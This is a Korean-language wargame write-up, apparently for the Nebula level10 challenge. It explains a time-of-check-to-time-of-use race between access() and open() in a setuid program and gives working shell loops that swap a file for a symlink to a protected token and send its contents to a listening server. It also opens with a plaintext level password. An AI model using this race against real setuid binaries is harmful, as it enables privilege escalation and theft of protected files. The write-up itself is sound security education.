> Password: s5cAJpM8ev6XHw998pRWG728z

# 접근 방법

홈 디렉토리에 있는 level10파일을 실행해보자.

```bash
$ ./level10
./level10 file host
	sends file to host if you have access to it
```

사용법을 보니 특정 파일을 읽어서 그 내용을 원격 호스트로 보내는 프로그램인 것을 알 수 있다. 

이번에는 홈 디렉토리에 있는 파일들의 권한을 확인해보자.

```bash
$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

`level10`은`set UID/GID`가 설정되어 있는 실행파일이고

`token`파일은 소유자가 `flag10`인 파일이다.

따라서 이번 목표는 `level10`프로그램을 이용해서 `token`파일을 읽고 그 내용을 원격으로 전송받는 것이라고 유추할 수 있다.

nc의 -l 옵션을 이용해서 간단한 echo 서버를 가동시킨 뒤 level10프로그램을 동작시키면,

```bash
./level10 token 127.0.0.1
You don't have access to token
```

`set uid`로 인해 읽기/쓰기 권한이 충분한데도 권한이 없다는 결과가 나온다.

`objdump`를 이용해서 프로그램의 흐름을 확인하면

1) 인자 유효성 검사
2) `access(2)`를 이용해서 입력 파일 권한 확인
3) 원격 서버에 접속
4) 파일을 읽은 후, 내용을 서버로 전송

과 같은 흐름임을 확인할 수 있다.

어떤 부분에서 권한이 없다는 결과가 나왔는지 확인하기 위해 `strace`를 이용하면

```
access("token", R_OK)                   = -1 EACCES (Permission denied)
```

`access` 함수에서 읽기 권한 확인이 실패한 것을 볼 수 있다.

이는 `access`함수가 `effective UID/GID`가 아닌 `real UID/GID`를 체크해서 생기는 문제이다. 따라서 `access`만 넘어갈 수 있다면, 뒤에 있을 `open / read`함수는 문제 없이 작동할 것으로 보인다.

`access`함수 호출과 동시에 `open`호출이 일어날 수 없다는 점을 이용해서 프로그램이 `access`함수를 호출할 때에는 권한이 있는 일반 파일을 읽게 한 후, `access`함수가 종료된 직후 같은 이름의 파일을 `~/token`에 대한 심볼릭 링크로 대체하면 `access`함수의 권한 확인을 통과하면서 `~/token`의 내용을 읽을 수 있다. 


### server
```bash
python3 server.py
```

### client 1
```bash
while true; do ~/level10 /tmp/temp [server ip address]; done
```

### client 2
```bash
# 아래 두 명령을 반복.

rm -f /tmp/temp && touch /tmp/temp
rm -f /tmp/temp && ln -s ~/token /tmp/temp
```